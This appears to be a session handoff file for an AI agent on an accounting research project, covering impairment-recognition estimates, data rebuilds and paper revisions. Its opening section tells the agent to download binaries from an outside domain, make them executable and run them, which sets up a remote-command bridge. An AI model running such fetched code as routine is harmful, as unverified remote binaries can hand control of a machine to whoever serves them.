---
project: wealth-tensor
gh_sha: 0569ab6576584aeea4f3cf6f0826d12088a530b0
updated: 2026-08-12
session: wealthTensor-15
gate_passed: true
gate_version: "2.50"
---

# wealth-tensor — HANDOFF

*Overwritten every session. `git log -p docs/HANDOFF.md` is the archive. Run
`python3 scripts/handoff_gate.py --check` before trusting this file.*

## 0 · TRANSPORT — darlish, zero-bridge

```
curl -s https://system.europeanflorist.com/dsh/darlish-up -o /tmp/darlish-up && chmod +x /tmp/darlish-up && /tmp/darlish-up
```

Post the printed `DARLISH-ENROLL v1 id=… fp=…` line **exactly** as a comment on Asana task
`1217316841710435` via the session's Asana MCP, then run `/tmp/darlish-up` again to collect.
**Re-run before diagnosing.** First collect has now worked `-06` through `-15` without exception;
`-15` was READY in one cycle and the bridge rotated zero times all session.

```
curl -s https://system.europeanflorist.com/dsh/dx -o /tmp/dx && chmod +x /tmp/dx
/tmp/dx '~/Scripts/roster join --who big-wealthTensor-16 --task "<what you are doing>"'
/tmp/dx '~/Scripts/roster claim --who big-wealthTensor-16 --resource wealth-tensor'
```

`export LESSONS_CONTRIBUTOR=opus` **before any `lessons.py add`**.

**Never inline a multi-line commit message in a `dx '...'` argument.** `printf '%s\n' …` into a
local file, `--put` it, `git commit -F`. Used three times this session, no incidents.

`dx --get` fails on binary — base64 both ways. Quote remote paths. Exit 3 = never reached darwin,
safe to re-run; exit 4 = started, check state first.

**The roster contention warning naming YOU is still noise.** Carded on State Machine
`1217420907841952` with three fixes. Do not spend a turn on it.

### Run the crawl in the CLOUD, not on darwin — new this session and it matters

`data.sec.gov` and `www.sec.gov` are both reachable from the Cowork container, which has ~30 GB
free. **darwin's disk is at 95%** (46 GB of 926 GB). A companyfacts crawl streams several GB. Do
it in the container, `--put` the small result. `edgar.py` comes over with one
`dx --get ~/repos/wealth-tensor/src/wealth_tensor/edgar.py` and needs no repo clone and no `gh`
auth. Full round trip for both universes: about 25 minutes.

### The editing tool that makes this project cheap — unchanged, and it caught a live one

Anchor-counting Python patch scripts, never `sed`. Nineteen edit sites across two patches this
session, **zero anchor failures**, because the manuscript was `dx --get`'d to the container first
and every anchor was copied out of the real text rather than composed from memory. At 2,249 lines
the whole file is 150 KB — pull it, patch against a local copy until it is clean, then ship the
patch.

**AND THE TRAP THAT COST THIS SESSION A CATCH — it is new, and nothing in the patch reports it.**
An anchor whose `old` string spans a **structural delimiter** must re-emit that delimiter in `new`.
Inserting §5.4 before `## 6`, the anchor ran through `---` and the `## 6` heading to be unique; the
replacement did not put them back. **Every anchor resolved exactly once, the patch reported
success, 138 tests passed, and §6 was silently absorbed into §5.** The only symptom was the coach
ratchet rising 6 → 7 — still inside its budget, therefore not a blocker, therefore very nearly
explained away. Diff `grep -n "^## "` before and after any insertion that touches a heading.

## 1 · WHAT HAPPENED — α WAS NEVER MEASURED, AND IT IS NOT 0.05

`REG-003` registered and pushed before a line of the instrument existed;
`scripts/wt089_recognition_and_offdiagonal.py` — **10 severe · 0 definitional · 0 vacuous**;
**138 tests green (was 124)**; coach ratchet unchanged at **6**; gate PASS.

`wt088` closed §4.4 by establishing that the deferral measure exists only where α > δ, and that at
the calibrated α = 0.05 **no disclosed useful life short enough to appear in a filing qualifies.**
α was never estimated. It was chosen. The PRE-002 sample measures exactly that quantity — the
interval from onset of deterioration to charge — once per event, and had never been asked for its
level.

> **α̂ = 0.1227 per quarter (se 0.0046) = 0.408 per year, 95% [0.383, 0.432].**

**The calibration is low by an order of magnitude, so the domain restriction §4.4 reports is a
property of the calibration and not of the disclosure.** The rectangle is inside the domain; §4.4's
first-rung result now holds at a measured rate. Two universes 0.433 / 0.394; three PRE-002
sensitivities 0.397 / 0.499 / 0.413; four truncations 0.396–0.404. **Range across every cut
0.327–0.499, and no interval contains 0.05.**

**The shape was fitted, not assumed, and that is where the interesting part is.** Discrete Weibull
**k̂ = 1.210 [1.135, 1.285]**, excluding the constant hazard the model assumes, stable under
truncation at 8, 12 and 16 quarters. **Recognition is bimodal:** 175 of 695 events are charged one
quarter after the peak, and the remaining three quarters face a hazard *rising* from 0.09 to 0.25
over five years (those alone give k̂ = 1.70). The longer a gap has been open, the likelier it is to
close — the opposite of the memorylessness a single α encodes.

**Three biases, direction registered before the number.** Two push up (no filing exists for a gap
never recognised; revenue peaks after value turns), one pushes down (no lag of zero in the sample).
REG-003 registered the asymmetry — *a low α̂ is strong evidence, a high one is weak* — so the cut
that matters removes the 175 lag-one events, where the onset bridge is least credible: **0.327,
still an order of magnitude above the calibration.**

**And the reporting layer is not diagonal.** §9's ninth limitation stated the assumption and named
its own test. Redrawing which of each firm's eligible quarters its per-class impairments land in,
10,000 draws: firm-quarters carrying two or more classes come in at **4.12×** (retail, 30 vs 7.3)
and **2.02×** (computer services, 44 vs 21.8), both *p* = 0.0002, both above, same direction, power
1.00 at a 5% injected excess. Limitation 9 is now a measured result. **What the design cannot do is
separate an economic coupling from the ordering ASC 360 imposes** — the recoverability screen runs
before the goodwill test, so one trigger makes two charges by the standards rather than by the
assets. The paper named that alternative before the test ran, and §5.4 says so where the number is.

## 2 · THE SAMPLE IS NOW AN ARTIFACT AND NOT A CACHE

The 688 events lived **only** in a dead cloud container's `$WT_EDGAR_CACHE`. Rebuilt from EDGAR:
**695 events, 99.0% agreement, three of four tier counts identical to the event.** The whole drift
is in goodwill, where restatement would put it. The registered reconciliation rule — written before
the count was known — admits it as the registered sample.

**`data/pre-002-events.json` (695 rows) and `data/pre-002-riskset.json` are committed.** No future
session pays 25 minutes and several GB for a table under a megabyte. `.gitignore` had `data/`
ignored, which would have dropped it silently; narrowed to `data/.universes/`. **Check `.gitignore`
before celebrating a committed artifact** — `git status` showed `?? data/` and nothing else.

**The two universes are not disjoint at the firm level.** Six firms changed SIC between 2013 and
2024 and enter both — Live Ventures, Ubiquity, Right On Brands, Fortune Valley Treasures, IAC and
Match Group — so the pooled unique count is **307, not 313**. It changes nothing in either
universe's own test. RESULT-002 reported 121 and 190 and never a union, so it was invisible rather
than absent. Any future *pooled* statistic should know.

## 3 · THE REGISTRATION FAMILY IS NOW THREE, AND THE THIRD IS ABOUT THE ESTIMATOR

`-14` paid for two questions to ask of every falsifier before pushing it. `-15` paid for the third,
and the useful part is that it is a *different kind* of question:

> **Which outcomes does this threshold fail to separate?** *(the falsifier)*
> **Is the set I am taking a share of guaranteed non-empty?** *(the falsifier)*
> **Which values can this instrument not produce, and does my estimator assign them mass?**
> *(the ESTIMATOR)*

REG-003 registered a geometric on support {0, 1, 2, …}. `peak_onset` dates the peak strictly before
the charge quarter, so **a lag of zero is unreachable by construction** and the estimator put mass
where the instrument cannot produce an observation — understating α̂ by about five annualised
points. Reported at the registered specification with the shifted figure beside it, as an erratum
in `RESULT-REG-003.md` §5. **A registration can carry a flawless falsifier attached to an estimator
whose support does not match its instrument's range.** All three questions cost one sentence each,
before any data arrive. All three are banked globally in `claude-blackbook`.

## 4 · THE PAPERS

**Paper III** — `docs/papers/paper-III-dual-tensor/paper-III.md`, **2,249 lines** (was 2,137).
Prior version at `paper-III.md.bak-pre-wt089`. Numbering preserved.

| § | what changed |
|---|---|
| **5.4 · NEW** | the two registered results — the rebuild, α̂ and its shape, the three biases, the off-diagonal table, and the ASC 360 alternative the design cannot exclude |
| 4.4 | the domain paragraph's closing sentence: the open question it posed is answered by measurement. **One number and the sentences that carry it. The argument was not reopened.** |
| 9 · L9 | "is an assumption, and it is testable" → "**is an assumption, it was testable, and it is false**", with the magnitude and the bounded consequence |
| 9 · L4 | α removed from the list of swept-not-measured parameters, because it is no longer in it |
| 7 | the domain row corrected (it was true only at the calibrated rate) and **four rows added** |
| abstract | the recognition rate and the diagonality rejection, in the sentence that posed the question |

**Bibliography repairs, from the reference pass run in parallel with the writing:**

- **`Ryan (1995)` was a DANGLING CITATION** — cited once at §4.7, zero entries. Now entered, with
  the 1995 erratum (two typesetting errors in an equation §4.7 does not use).
- **The citation was too strong, in this project's known failure mode for the third time.** Ryan's
  model *assumes conservatism away* (his A8) and carries the firm effect as a nuisance control; the
  bias/lag reading is Beaver and Ryan's. He supplied the regression. §4.7 now says which half is
  whose. **The overreach was inherited from B&R's own self-description** — they write "we use
  empirical methods developed by Ryan [1995] to distinguish the bias and lag components" — so the
  manuscript was faithfully repeating its source, and still had to narrow.
- The quoted B&R sentence is on **p. 128**, not p. 135; p. 135 has "six lagged *annual* returns".
- **Nine reference-list annotations cited "§9" for material in §10.** Verified by locating each
  entry's surname in the body: not one of the nine appears in §9. A section was inserted and the
  annotations were never renumbered.
- 2000 → 2026 is twenty-six years, given as "a quarter of a century" and "twenty-five years".
- **Zhu (2016) is now cited in §10, against §2 and not for it.** It runs §10's own discriminating
  tests — CFO option incentives, weak monitoring — on the accruals of long-lived operating assets,
  and the agency account *survives* them. It is the accounting layer §10 notes Jin and Myers lack,
  supplied for the competing explanation. Citing it as support would be a misreading.

**The two PDFs on disk are now read and closed. The bibliography is finished.**

## 5 · THE AT-BAT, RANKED

1. **DOES THE FRAMEWORK SURVIVE AN AGE-DEPENDENT RECOGNITION RATE?** This is the largest live
   question in the corpus and `-15` created it. The model assumes a constant α; the data reject it
   at k̂ = 1.21 [1.135, 1.285], and the rejection is not a tail artefact. **R = (1 − φ)δ/(α − δ) is
   derived under a constant hazard.** Nobody has asked what the steady-state deferral measure
   becomes when α rises with the age of the gap — whether the closed form survives with an
   effective α, whether the §4.4 crossing moves, whether the domain boundary moves. It is pure
   theory on a result already in print, it needs no data, and §4.8's goodwill limit is the place it
   is most likely to bite. **Register before deriving anything that could be reported as a result.**
2. **SEPARATE THE ECONOMIC COUPLING FROM ASC 360's SEQUENCING.** §5.4 establishes departure from
   diagonality at 2–4× and explicitly cannot say why. The discriminator is the **triggering
   disclosure**, not the charge: ASC 360's screen is ordered before the goodwill test, so a design
   that reads the trigger narrative separates them. That is new data and a new registration, and it
   is the natural sequel to the only result Limitation 9 ever asked for.
3. **THE σ-AND-LIFETIME RESULT — and `-15` establishes it needs new data, so stop planning it as
   if it does not.** §4.7 says identification strength is a property of the asset. Realised return
   volatility and disclosed useful lives are **not in this sample**; Companion C reports severity
   dispersion by class instead and the intervals overlap. Doing it properly means prices and a
   filing scrape. Do not proxy: a quantity that shares σ's name and not its meaning is WT-038.
4. **THE `## References` PROVENANCE BLOCK IS THE LARGEST REMAINING CHARTER §3.3 EXPOSURE.**
   About thirty lines of the paper narrating its own conduct — "Four passes ran, in this order" —
   sitting in a section the ratchet counts. It is not caught by the counter's literal phrase list,
   and it encodes a genuinely valuable lesson, so `-15` left it rather than gutting it unilaterally.
   **Somebody should rule on whether it is the one methods paragraph charter §3.3 allows or three
   paragraphs too many.** Ask Jason; it is a taste call on a real trade-off.

## 6 · WHAT NOT TO DO

- **Do not restore the neat sentence.** *"PRE-001 was doomed by the φδ confound"* is false.
- **Do not read §5.4 as a rescue of PRE-001.** REG-003 §7 ruled this out in writing before the
  number existed: a smaller effective sample widens PRE-002's intervals, it does not move its point
  estimates, which were flat.
- **Do not re-claim the mathematics.** Bateman/flip-flop is conceded in §4.2 on purpose. Do not
  restore "global rather than local" to Kuan, the unordered-pair statement to Bellman & Åström, or
  the bias/lag design to Ryan (1995) — all three are the wrong claim in somebody's mouth.
- **Do not reopen Griliches (1967).** Closed with evidence.
- **Do not polish §4.4 or §5.4.** §4.4 has been rewritten whole twice and had one number changed
  this session. §5.4 is a day old and reports registered results.
- **Do not hand Jason a ranked list of problems as a deliverable** (WT-079). **No pure teardown**
  (WT-078).
- **Do not invoke Mayo or severity as a *warrant*.** Pragmatic justification.
- **Do not ask him to submit anything. Never add a free parameter to absorb an objection.**
- **Do not rewrite or summarise the charter inside a handoff.** Read it; it is binding.
- **Adding a section means deleting narration elsewhere, not refreshing `.coach-baseline.json`.**
  `-15` added §5.4 (~78 lines) and four ledger rows and stayed at 6 without deleting anything,
  because none of it narrates conduct. That is the mechanism working, not a loophole.

## 7 · THINGS THAT WILL BITE YOU

1. **The structural-delimiter patch trap.** §0. It is silent, it passes every check, and its only
   symptom was a metric moving inside its own budget.
2. **`severity.check()` executes its witness immediately.** Define every helper a witness touches
   ABOVE the first check using it. It also **caught a phantom-tag witness in 0.16 s** this session —
   a witness comparing two event sets whose marginals were identical by construction, which would
   have carried a power figure. The harness is worth running before the data arrive.
3. **The repo's tests need `./.venv/bin/python`**, not system python3 — `scipy` is only in the venv.
   `python3 -m pytest` dies at collection on `test_cournot.py`.
4. **`gate-selfcheck` is PASS.** The three `HANDOFF-floristAlix-2.md` warnings are report-only
   handoff-lint on another project's document, not gate failures, and not ours. If the *gate*
   fails for you, the failure is new — check `roster who` before blaming a sibling.

## 8 · DEFINITION OF DONE

Three pre-prints posted. Paper III is closest. **§4 is finished work, §4.4 is closed as an argument,
and as of this session Limitation 9 is closed as a question and the bibliography is finished.**
What remains on Paper III is one theory question the data created — whether the framework survives
the age-dependent recognition rate it now knows about — and two designs that need data it does not
have. **The structural queue is empty and the empirical queue is now empty too; the theory queue has
exactly one item on it, and item 1 is that item.**

## 9 · ORIENT-THEN-GO

Emit one line — `Oriented: <state> · at-bat: <X> · opening with <first action>.` — then start
writing. Don't wait for the go, and ask for a ruling when you need one.

*The section asked what the recognition rate is, and got an answer an order of magnitude away from
the number it had been assuming — which dissolves the domain restriction §4.4 spent a session
establishing and promotes its most striking sub-result from conditional to actual. Then the same
sample rejected the constant hazard the whole closed form is derived under. The paper went looking
for a parameter and came back with a question about its own algebra.* ⚒️
